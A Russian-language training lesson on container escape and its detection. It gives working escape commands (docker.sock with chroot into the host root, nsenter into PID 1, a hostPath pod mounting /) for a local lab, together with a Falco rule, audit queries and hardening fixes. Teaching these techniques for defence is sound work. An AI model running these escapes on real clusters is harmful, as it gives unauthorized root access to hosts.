# 16.4 — Container escape и cloud detection

> **M16 · Этап 3 · 5 ч · 🔴 · артефакт:** `labs/m16-cloud-k8s/l04-detect/`

## Цель

Понять, как контейнер выходит на хост, и как cloud/container-среда детектится. Собрать телеметрию и правила.

## Результат

- 3 сценария escape (в лабе).
- Список событий для детекта.
- 2 правила (Falco/Sigma/CloudTrail).

## Теория

### 1. Модель изоляции

Контейнер — это процесс с namespace и cgroups, а не VM. Границы:

- **namespaces** — PID, NET, MNT, UTS, IPC, USER.
- **cgroups** — ресурсы.
- **capabilities** — привилегии.
- **seccomp/AppArmor/SELinux** — ограничения.
- **rootless** — без root на хосте.

### 2. Векторы escape

| Вектор | Условие |
|---|---|
| `--privileged` | доступ к устройствам |
| `hostPath` | монтирование `/` хоста |
| `docker.sock` | доступ к Docker API |
| `CAP_SYS_ADMIN` | монтирование, `nsenter` |
| kernel exploit | уязвимость ядра |
| `/proc/sysrq-trigger` | перезагрузка/доступ |
| cgroup release_agent | старые ядра |

### 3. Пример: docker.sock

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

Ожидаемо: root на хосте. Это классика CI/CD.

### 4. Пример: privileged

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

Ожидаемо: shell в namespace хоста.

### 5. Cloud detection

- **CloudTrail/Activity/Sign-in** — API-аномалии.
- **GuardDuty/Defender** — поведенческие алерты.
- **Falco** — runtime в K8s.
- **Audit log** — кто что делал.
- **VPC flow logs** — сеть.
- **Config rules** — drift.

### 6. Что детектить

- Privileged pod, hostPath, hostNetwork.
- `docker.sock` mount.
- `nsenter`, `chroot`, `mount` в контейнере.
- SA token с правами.
- Аномальные API-вызовы.

## Лаборатория

> `k3d`/`kind`, Docker. Всё локально.

### 1. Проверка привилегий

```bash
docker run --rm -it --privileged alpine sh
cat /proc/1/cgroup
capsh --print
```

Ожидаемо: полный набор capabilities.

### 2. hostPath

```bash
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: hostpath}
spec:
  containers:
  - name: c
    image: alpine
    command: ["sleep","3600"]
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
EOF
kubectl exec -it hostpath -- ls /host
```

Ожидаемо: файлы хоста.

### 3. docker.sock

```bash
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker sh
docker ps
```

Ожидаемо: управление Docker хоста.

### 4. Falco

Установите Falco (если ресурсы позволяют) или разберите пример правила:

```yaml
- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: spawned_process and container and shell_procs
  output: Shell spawned (user=%user.name container=%container.id)
  priority: WARNING
```

Ожидаемо: срабатывание на `kubectl exec`.

### 5. CloudTrail/audit

```bash
aws cloudtrail lookup-events --max-results 10
kubectl get events -A --sort-by=.lastTimestamp | tail
```

### 6. Матрица

| Вектор | Условие | Событие | Правило |
|---|---|---|---|

## Атака и защита

- **Атака:** privileged/hostPath/sock → хост.
- **Детект:** Falco, audit, CloudTrail, GuardDuty.
- **Фикс:** PSA restricted, запрет privileged/hostPath, read-only rootfs, seccomp, rootless, минимальные capabilities.

## Самопроверка

- [ ] Чем namespace отличается от VM?
- [ ] Почему `docker.sock` — критично?
- [ ] Что даёт `CAP_SYS_ADMIN`?
- [ ] Какие события Falco искать?
- [ ] Как PSA ограничивает pod?

## Дальше

[Контрольная M16](exam.md)
